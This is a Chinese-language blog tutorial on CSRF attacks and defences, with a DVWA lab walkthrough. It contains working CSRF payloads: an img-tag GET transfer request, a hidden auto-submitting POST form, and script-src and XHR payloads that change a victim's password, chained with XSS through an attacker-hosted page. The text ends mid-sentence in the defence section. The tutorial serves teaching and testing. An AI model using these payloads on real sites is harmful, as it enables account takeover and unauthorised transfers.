<!DOCTYPE html><html class="theme-next pisces use-motion" lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><script src="/lib/pace/pace.min.js?v=1.0.2"></script><link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2"><link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css"><link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0"><link rel="stylesheet" href="/css/main.css?v=7.2.0"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.2.0"><link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.2.0"><link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.2.0"><link rel="mask-icon" href="/images/logo.svg?v=7.2.0" color="#222"><script id="hexo.configurations">var NexT=window.NexT||{},CONFIG={root:"/",scheme:"Pisces",version:"7.2.0",sidebar:{position:"left",display:"post",offset:12,onmobile:!1,dimmer:!1},back2top:!0,back2top_sidebar:!0,fancybox:!0,fastclick:!1,lazyload:!1,tabs:!0,motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},algolia:{applicationID:"",apiKey:"",indexName:"",hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}}}</script><script>!function(e,t,o,a,c,i,d){e.DaoVoiceObject=c,e[c]=e[c]||function(){(e[c].q=e[c].q||[]).push(arguments)},e[c].l=1*new Date,i=t.createElement(o),d=t.getElementsByTagName(o)[0],i.async=1,i.src=a,i.charset="utf-8",d.parentNode.insertBefore(i,d)}(window,document,"script",("https:"==document.location.protocol?"https:":"http:")+"//widget.daovoice.io/widget/dda712fb.js","daovoice"),daovoice("init",{app_id:"dda712fb"}),daovoice("update")</script><meta name="description" content="长风破浪会有时，直挂云帆济沧海　　CSRF（Cross Site Request Forgery）跨站域请求伪造，是一种网络的攻击方式，它在2007年曾被列为互联网20大安全隐患之一,也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用，也就是人们所知道的钓鱼网站。"><meta name="keywords" content="CSRF,跨站域请求伪造攻击"><meta property="og:type" content="article"><meta property="og:title" content="CSRF的攻击与防御原理"><meta property="og:url" content="https://xiaoxiaoxiaoxiaolin.github.io/posts/21bbd6b8.html/index.html"><meta property="og:site_name" content="小晓晓晓林"><meta property="og:description" content="长风破浪会有时，直挂云帆济沧海　　CSRF（Cross Site Request Forgery）跨站域请求伪造，是一种网络的攻击方式，它在2007年曾被列为互联网20大安全隐患之一,也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用，也就是人们所知道的钓鱼网站。"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://xiaoxiaoxiaoxiaolin.github.io/posts/21bbd6b8.html/CSRF%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9E%8B.jpeg"><meta property="og:image" content="https://xiaoxiaoxiaoxiaolin.github.io/posts/21bbd6b8.html/CSRF%E7%9A%84%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86.jpeg"><meta property="og:image" content="https://xiaoxiaoxiaoxiaolin.github.io/posts/21bbd6b8.html/CSRF%E6%BC%8F%E6%B4%9E-Get%E6%96%B9%E5%BC%8F%E5%88%A9%E7%94%A8.png"><meta property="og:image" content="https://xiaoxiaoxiaoxiaolin.github.io/posts/21bbd6b8.html/CSRF%E6%BC%8F%E6%B4%9E-Get%E6%96%B9%E5%BC%8F%E5%88%A9%E7%94%A8-%E6%BC%8F%E6%B4%9E%E7%A1%AE%E8%AE%A4.png"><meta property="og:image" content="https://xiaoxiaoxiaoxiaolin.github.io/posts/21bbd6b8.html/CSRF%E6%BC%8F%E6%B4%9E-Get%E6%96%B9%E5%BC%8F%E5%88%A9%E7%94%A8-%E6%BC%8F%E6%B4%9E%E7%A1%AE%E8%AE%A42.png"><meta property="og:image" content="https://xiaoxiaoxiaoxiaolin.github.io/posts/21bbd6b8.html/POST%E6%96%B9%E5%BC%8F.png"><meta property="og:image" content="https://xiaoxiaoxiaoxiaolin.github.io/posts/21bbd6b8.html/POST%E6%96%B9%E5%BC%8F2.png"><meta property="og:image" content="https://xiaoxiaoxiaoxiaolin.github.io/posts/21bbd6b8.html/POST%E6%96%B9%E5%BC%8F%E9%AA%8C%E8%AF%81.png"><meta property="og:image" content="https://xiaoxiaoxiaoxiaolin.github.io/posts/21bbd6b8.html/POST%E6%96%B9%E5%BC%8F%E6%8A%93%E5%8C%85%E7%BB%93%E6%9E%9C.png"><meta property="og:image" content="https://xiaoxiaoxiaoxiaolin.github.io/posts/21bbd6b8.html/CSRFTester.png"><meta property="og:image" content="https://xiaoxiaoxiaoxiaolin.github.io/posts/21bbd6b8.html/CSRFTester%E5%88%9B%E5%BB%BA%E7%9A%84%E8%A1%A8%E5%8D%95.png"><meta property="og:image" content="https://xiaoxiaoxiaoxiaolin.github.io/posts/21bbd6b8.html/CSRFTester%E6%94%BE%E7%BD%AE%E7%AB%99%E7%82%B9.png"><meta property="og:image" content="https://xiaoxiaoxiaoxiaolin.github.io/posts/21bbd6b8.html/ajax.png"><meta property="og:image" content="https://xiaoxiaoxiaoxiaolin.github.io/posts/21bbd6b8.html/%E5%88%A9%E7%94%A8%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%9B%B4%E6%94%B9%E5%AF%86%E7%A0%81.png"><meta property="og:image" content="https://xiaoxiaoxiaoxiaolin.github.io/posts/21bbd6b8.html/%E7%99%BB%E9%99%86%E6%88%90%E5%8A%9F.png"><meta property="og:updated_time" content="2019-08-22T12:29:58.389Z"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="CSRF的攻击与防御原理"><meta name="twitter:description" content="长风破浪会有时，直挂云帆济沧海　　CSRF（Cross Site Request Forgery）跨站域请求伪造，是一种网络的攻击方式，它在2007年曾被列为互联网20大安全隐患之一,也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用，也就是人们所知道的钓鱼网站。"><meta name="twitter:image" content="https://xiaoxiaoxiaoxiaolin.github.io/posts/21bbd6b8.html/CSRF%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9E%8B.jpeg"><link rel="alternate" href="/atom.xml" title="小晓晓晓林" type="application/atom+xml"><link rel="canonical" href="https://xiaoxiaoxiaoxiaolin.github.io/posts/21bbd6b8/"><script id="page.configurations">CONFIG.page={sidebar:""}</script><title>CSRF的攻击与防御原理 | 小晓晓晓林</title><noscript><style>.sidebar-inner,.use-motion .brand,.use-motion .collection-title,.use-motion .comments,.use-motion .menu-item,.use-motion .motion-element,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .logo,.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line-before i{left:initial}.use-motion .logo-line-after i{right:initial}</style></noscript><canvas class="fireworks" style="position:fixed;left:0;top:0;z-index:1;pointer-events:none"></canvas><script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script><script type="text/javascript" src="/js/src/yanhuatexiao.js"></script></head><body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN"><div class="container sidebar-position-left page-post-detail"><div class="headband"></div><a href="https://github.com/xiaoxiaoxiaoxiaolin" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#151513;color:#fff;position:absolute;top:0;border:0;right:0" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style><header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-wrapper"><div class="site-meta"><div class="custom-logo-site-title"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span> <span class="site-title">小晓晓晓林</span> <span class="logo-line-after"><i></i></span></a></div><h1 class="site-subtitle" itemprop="description">夜深忽梦少年事❤️唯梦闲人不梦君</h1></div><div class="site-nav-toggle"><button aria-label="切换导航栏"><span class="btn-bar"></span> <span class="btn-bar"></span> <span class="btn-bar"></span></button></div></div><nav class="site-nav"><ul id="menu" class="menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i><br>首页</a></li><li class="menu-item menu-item-top"><a href="/top/" rel="section"><i class="menu-item-icon fa fa-fw fa-signal"></i><br>热榜</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i><br>分类<span class="badge">3</span></a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i><br>标签<span class="badge">10</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i><br>归档<span class="badge">6</span></a></li><li class="menu-item menu-item-navigation"><a href="/navigation/" rel="section"><i class="menu-item-icon fa fa-fw fa-paper-plane"></i><br>导航</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i><br>关于</a></li><li class="menu-item menu-item-search"><a href="javascript:;" class="popup-trigger"><i class="menu-item-icon fa fa-search fa-fw"></i><br>搜索</a></li></ul><div class="site-search"><div class="popup search-popup local-search-popup"><div class="local-search-header clearfix"><span class="search-icon"><i class="fa fa-search"></i> </span><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span><div class="local-search-input-wrapper"><input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input"></div></div><div id="local-search-result"></div></div></div></nav></div></header><main id="main" class="main"><div class="main-inner"><div class="content-wrap"><div id="content" class="content"><div id="posts" class="posts-expand"><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="https://xiaoxiaoxiaoxiaolin.github.io/posts/21bbd6b8.html/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="L"><meta itemprop="description" content="我们都如星辰😊需努力活得璀璨"><meta itemprop="image" content="/images/avatar.gif"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="小晓晓晓林"></span><header class="post-header"><h2 class="post-title" itemprop="name headline">CSRF的攻击与防御原理</h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2019-08-22 09:27:05" itemprop="dateCreated datePublished" datetime="2019-08-22T09:27:05+08:00">2019-08-22</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web安全/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a></span> </span><span id="/posts/21bbd6b8.html/" class="post-meta-item leancloud_visitors" data-flag-title="CSRF的攻击与防御原理"><span class="post-meta-item-icon"><i class="fa fa-thermometer"></i> </span><span class="post-meta-item-text">热度：</span> <span class="leancloud-visitors-count"></span> <span>℃</span></span><br><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-keyboard-o"></i> </span><span class="post-meta-item-text">本文字数：</span> <span title="本文字数">8.8k</span> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-hourglass-half"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span title="阅读时长">22 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><blockquote class="blockquote-center">长风破浪会有时，直挂云帆济沧海</blockquote><p>　　CSRF（Cross Site Request Forgery）跨站域请求伪造，是一种网络的攻击方式，它在2007年曾被列为互联网20大安全隐患之一,也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用，也就是人们所知道的钓鱼网站。</p><a id="more"></a><h3 id="CSRF介绍"><a href="#CSRF介绍" class="headerlink" title="CSRF介绍"></a>CSRF介绍</h3><p>　　CSRF攻击可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击站点，从而在并未授权的情况下执行在权限保护之下的操作，有很大的危害性。</p><p>　　尽管听起来跟XSS跨站脚本攻击有点相似，但事实上CSRF与XSS差别很大，<strong>XSS</strong>利用的是<strong>站点内的信任用户</strong>，而<strong>CSRF</strong>则是<strong>通过伪装来自受信任用户的请求来利用受信任的网站</strong>。</p><p>　　与XSS攻击相比，CSRF攻击往往不大流行，因此对其进行防范的资源也相当稀少和难以防范，所以CSRF被认为比XSS更具危险性。</p><p><img src="/posts/21bbd6b8.html/CSRF%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9E%8B.jpeg" alt></p><p>　　上图为CSRF攻击的一个简单模型，用户访问恶意网站B，恶意网站B返回给用户的HTTP信息中要求用户访问网站A，而由于用户和网站A之间可能已经有信任关系导致这个请求就像用户真实发送的一样会被执行。</p><h3 id="CSRF的攻击原理"><a href="#CSRF的攻击原理" class="headerlink" title="CSRF的攻击原理"></a>CSRF的攻击原理</h3><p><img src="/posts/21bbd6b8.html/CSRF%E7%9A%84%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86.jpeg" alt></p><p>1、用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；</p><p>2、在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；</p><p>3、用户在未退出网站A的情况下（cookie有效的情况），在同一浏览器中，打开了另一个网站B；</p><p>4、网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问站点A，这个请求会带上浏览器端所保存的有效的站点A的cookie；</p><p>5.、浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。</p><p>　　因此，站点A会报据用户C的权限来处理恶意站点B所发起的请求，而这个请求可能以用户C的身份发送邮件、短信、消息，以及进行转账支付等操作，这样恶意站点B就达到了伪造用户C请求站点 A的目的。</p><p>　　受害者只需要做下面两件事情，攻击者就能够完成CSRF攻击：</p><ul><li>登录受信任站点 A，并在本地生成cookie；</li><li>在不登出站点A（站点A的cookie有效）的情况下，访问恶意站点B。</li></ul><p>　　看到这里，你也许会说：“如果我不满足以上两个条件中的一个，我就不会受到CSRF的攻击。”是的，确实如此，但你不能保证以下情况不会发生：</p><p>1、你不能保证你登录了一个网站后，不再打开一个tab页面并访问另外的网站。</p><p>2、你不能保证你关闭浏览器了后，你本地的Cookie立刻过期，你上次的会话已经结束。事实上，关闭浏览器不能结束一个会话，但大多数人都会错误的认为关闭浏览器就等于退出登录/结束会话了。</p><p>3、上图中所谓的攻击网站，很多情况下可能是一个存在其他漏洞（如XSS）的可信任且经常被人访问的网站。</p><h3 id="CSRF的攻击举例"><a href="#CSRF的攻击举例" class="headerlink" title="CSRF的攻击举例"></a>CSRF的攻击举例</h3><p>　　假设某银行网站A以GET请求来发起转账操作，转账的地址为<code>www.xxx.com/transfer.do？accountNum=l000l&amp;money=10000</code>，参数accountNum表示转账的账户，参数money表示转账金额。<br>而某大型论坛B上，一个恶意用户上传了一张图片，而图片的地址栏中填的并不是图片的地址，而是前而所说的砖账地址：<code>&lt;img src=&quot;http://www.xxx.com/transfer.do?accountNum=l000l&amp;money=10000&quot;&gt;</code></p><p>　　当你登录网站A后，没有及时登出，这时你访问了论坛B，不幸的事情发生了，你会发现你的账号里面少了10000块。</p><p>　　为什么会这样呢，在你登录银行A时，你的浏览器端会生成银行A的cookie，而当你访问论坛B的时候，页面上的<code>&lt;img&gt;</code>标签需要浏览器发起一个新的HTTP请求，以获得图片资源，当浏览器发起请求时，请求的却是银行A的转账地址<code>www.xxx.com/transfer.do?accountNum=l000l&amp;money=10000</code>，并且会带上银行A的cookie信息，结果银行的服务器收到这个请求后，会以为是你发起的一次转账操作，因此你的账号里边便少了10000块。</p><p>　　当然，绝大多数网站都不会使用GET请求来进行数据更新，因此，攻击者也需要改变思路，与时俱进。</p><p>　　假设银行将其转账方式改成POST提交，而论坛B恰好又存在一个XSS漏洞，恶意用户在它的页面上植入如下代码：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=<span class="string">"aaa"</span> action=<span class="string">"http://www.xxx.com/transfer.do"</span> metdod=<span class="string">"<span class="keyword">POST</span>"</span> display=<span class="string">"none"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"accountNum"</span> value=<span class="string">"10001"</span>/&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"money"</span> value=<span class="string">"10000"</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var form = document.forms('aaa');</span><br><span class="line">    form.submit();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>　　如果你此时恰好登录了银行A，且没有登出，当你打开上述页面后，脚本会将表单aaa提交，把accountNum和money参数传递给银行的转账地址<code>http://www.xxx.com/transfer.do</code>，同样的，银行以为是你发起的一次转账会从你的账户中扣除10000块。</p><p>　　当然，以上只是举例，正常来说银行的交易付款会有USB key、验证码、登录密码和支付密码等一系列屏障，流程比上述流程复杂得多，因此安全系数也高得多。</p><h3 id="DVWA下的CSRF攻击实验"><a href="#DVWA下的CSRF攻击实验" class="headerlink" title="DVWA下的CSRF攻击实验"></a>DVWA下的CSRF攻击实验</h3><h4 id="CSRF漏洞🔺Get方式利用"><a href="#CSRF漏洞🔺Get方式利用" class="headerlink" title="CSRF漏洞🔺Get方式利用"></a>CSRF漏洞🔺Get方式利用</h4><p><img src="/posts/21bbd6b8.html/CSRF%E6%BC%8F%E6%B4%9E-Get%E6%96%B9%E5%BC%8F%E5%88%A9%E7%94%A8.png" alt></p><p>漏洞确认：</p><p>1、修改密码，没有对原密码进行验证，直接修改了， 判断缺少验证机制，可能存在CSRF</p><p><img src="/posts/21bbd6b8.html/CSRF%E6%BC%8F%E6%B4%9E-Get%E6%96%B9%E5%BC%8F%E5%88%A9%E7%94%A8-%E6%BC%8F%E6%B4%9E%E7%A1%AE%E8%AE%A4.png" alt></p><p>2、确认referer无限制，无token</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">123.129</span><span class="regexp">/dvwa/</span>vulnerabilities<span class="regexp">/csrf/</span>?password_new=password&amp;password_conf=password&amp;Change=Change<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/posts/21bbd6b8.html/CSRF%E6%BC%8F%E6%B4%9E-Get%E6%96%B9%E5%BC%8F%E5%88%A9%E7%94%A8-%E6%BC%8F%E6%B4%9E%E7%A1%AE%E8%AE%A42.png" alt></p><p>漏洞利用：</p><p>1、直接发送链接</p><p>2、诱骗用户点击</p><p>3、会弹出提示</p><p>缺点：该利用方法，容易被用户发现。</p><p>改进思路：</p><p>　　结合XSS，形成XSRF。用户触发XSS漏洞（存储型最佳），然后XSS漏洞执行script<code>&lt;script src=&quot;修改密码的链接&quot;&gt;&lt;/script&gt;</code>。前提是需要在用户访问概率高的网站上挖到XSS漏洞，或者欺骗用户访问钓鱼站点。</p><p>改进流程：</p><p>１、保持dvwa中csrf页面的登录（尾数129）<br>２、部署一个csrf站点（尾数130），利用XSS(Stored);<br>３、在130增加一个XSS埋伏</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.123.129/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>４、重新用步骤3的密码123登录，观察效果。</p><h4 id="CSRF漏洞🔺Post方式利用"><a href="#CSRF漏洞🔺Post方式利用" class="headerlink" title="CSRF漏洞🔺Post方式利用"></a>CSRF漏洞🔺Post方式利用</h4><h5 id="使用CSRFTester思路"><a href="#使用CSRFTester思路" class="headerlink" title="使用CSRFTester思路"></a>使用CSRFTester思路</h5><p>环境准备：</p><p>修改DVWA下CSRF漏洞的源码为POST方式提交</p><p>找到<code>/csrf的index.php</code>，将<code>get</code>提交方式修改为<code>post</code></p><p>找到<code>/csrf的low.php</code>，将<code>$＿GET</code>修改为<code>$＿REQUEST</code>(说明:这个表示可以用get也可以用POST)</p><p><img src="/posts/21bbd6b8.html/POST%E6%96%B9%E5%BC%8F.png" alt></p><p><img src="/posts/21bbd6b8.html/POST%E6%96%B9%E5%BC%8F2.png" alt></p><p>测试是否成功修改POST提交方式</p><p>POST方式提交，提交后URL不会出现具体的参数及参数值</p><p><img src="/posts/21bbd6b8.html/POST%E6%96%B9%E5%BC%8F%E9%AA%8C%E8%AF%81.png" alt></p><p>抓取POST提交方式的数据包</p><p><img src="/posts/21bbd6b8.html/POST%E6%96%B9%E5%BC%8F%E6%8A%93%E5%8C%85%E7%BB%93%E6%9E%9C.png" alt></p><p>通过OWASP CSRFTester抓包</p><p><img src="/posts/21bbd6b8.html/CSRFTester.png" alt></p><p>OWASP CSRFTester构建表单</p><p>Forms，创建一个form表单。内容为hidden，用户不可见（可get、post）</p><p>iFrame：创建一个iframe框架，高宽为0，用户不可见（可get、post ）</p><p>IMG：创建一个IMG标签（只能get）</p><p>XHR：创建一个AJAX请求（可get、post ）</p><p>Link：创建一个a标签的超链接（只能get）</p><p>修改上一步生产的index.html</p><p><img src="/posts/21bbd6b8.html/CSRFTester%E5%88%9B%E5%BB%BA%E7%9A%84%E8%A1%A8%E5%8D%95.png" alt></p><p>将文档放置在csrf站点，<code>http://192.168.123.130/csrf/index.html</code></p><p><img src="/posts/21bbd6b8.html/CSRFTester%E6%94%BE%E7%BD%AE%E7%AB%99%E7%82%B9.png" alt></p><p>测试</p><p>1、保持dvwa在csrf的模块</p><p>2、在同一个浏览器输入url，<code>http://192.168.123.130/csrf/index.html</code>，然后退出dvwa页面登录，测试密码是否为444，但是没有办法静默执行，因为会有提示</p><h5 id="使用Ajax思路"><a href="#使用Ajax思路" class="headerlink" title="使用Ajax思路"></a>使用Ajax思路</h5><p>通过Ajax，xmlrequest往表单里面提交数据</p><p>环境准备：</p><p>1、在dvwa上，同时存在csrf和xss</p><p>2、在csrf站点上，制造ajax.html</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">xmlhttp=<span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="actionscript">xmlhttp.open(“POST”,http:<span class="comment">//192.168.123.129/dvwa/vulnerabilities/csrf/”,true);</span></span></span><br><span class="line">xmlhttp.setRequestHeader(“Content-type”,”application/x-www-form-urlencoded”);</span><br><span class="line">xmlhttp.send(“password_new=123456&amp;password_conf=123456”&amp;Change=Change”);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/posts/21bbd6b8.html/ajax.png" alt></p><p><code>http://192.168.123.130/csrf/ajax.html</code></p><p>3、在dvwa下，利用反射型XSS更改密码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.123.130/csrf/ajax.html"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/posts/21bbd6b8.html/%E5%88%A9%E7%94%A8%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%9B%B4%E6%94%B9%E5%AF%86%E7%A0%81.png" alt></p><p>此时密码已经修改</p><p>4、用admin和password登录成功</p><p><img src="/posts/21bbd6b8.html/%E7%99%BB%E9%99%86%E6%88%90%E5%8A%9F.png" alt></p><p>　　如果在目标站点本身上存在XSS，则可以这样利用，使用<code>&lt;script&gt;，&lt;img&gt;</code>标签。但目标站点如果存在XSS，则直接利用XSS比利用CSRF更便捷。</p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>　　<code>GET方式</code>，在用户活动状态下点击即可完成操作</p><p>　　<code>POST方式</code>，<code>参数不能通过URL提交，需要构建表单</code>，欺骗用户访问。该情况仍然结合XSS的比较多，或者直接诱骗用户访问攻击者自己搭建的钓鱼站点。</p><h3 id="CSRF漏洞检测😄"><a href="#CSRF漏洞检测😄" class="headerlink" title="CSRF漏洞检测😄"></a>CSRF漏洞检测😄</h3><p>　　如何确认一个web系统存在CSRF漏洞呢，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</p><h4 id="👉步骤1"><a href="#👉步骤1" class="headerlink" title="👉步骤1"></a>👉步骤1</h4><p>　　对目标站点进行踩点，对增删改的地方进行标记，并观察其逻辑</p><ul><li><p>比如修改管理员账户时，不需要提供验证旧密码</p></li><li><p>比如提交留言的动作，关注XX微博的动作等等</p></li></ul><h4 id="👉步骤2"><a href="#👉步骤2" class="headerlink" title="👉步骤2"></a>👉步骤2</h4><p>　　提交操作（get/post），观察http头部 的referer，并验证后台是否有referer限制</p><ul><li>比如使用抓包工具抓包，然后修改/删除referer后，重放， 看是否可以正常提交。</li></ul><h4 id="👉步骤3"><a href="#👉步骤3" class="headerlink" title="👉步骤3"></a>👉步骤3</h4><p>　　确认cookie的有效性（欺骗，或目标网 站存在漏洞）</p><ul><li>虽然退出或关闭了浏览器，但session并没有过期。</li></ul><p>　　随着对CSRF漏洞研究的不断深入，不断涌现出一些专门针对CSRF漏洞进行检测的工具，如CSRFTester，CSRF Request Builder。</p><p>以CSRFTester工具为例，CSRF漏洞检测工具的测试原理如下：</p><p>　　使用CSRFTester进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。</p><h3 id="CSRF攻击的防御👍"><a href="#CSRF攻击的防御👍" class="headerlink" title="CSRF攻击的防御👍"></a>CSRF攻击的防御👍</h3><p>　　目前防御CSRF攻击主要有三种策略：<code>验证HTTP Referer字段</code>；<code>在请求地址中添加token并验证</code>；<code>在HTTP头中自定义属性并验证</code>。</p><h4 id="验证HTTP-Referer字段"><a href="#验证HTTP-Referer字段" class="headerlink" title="验证HTTP Referer字段"></a>验证HTTP Referer字段</h4><p>　　根据HTTP协议，在HTTP头中有一个字段叫Referer，它记录了该HTTP请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问<code>http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</code>，用户必须先登陆bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 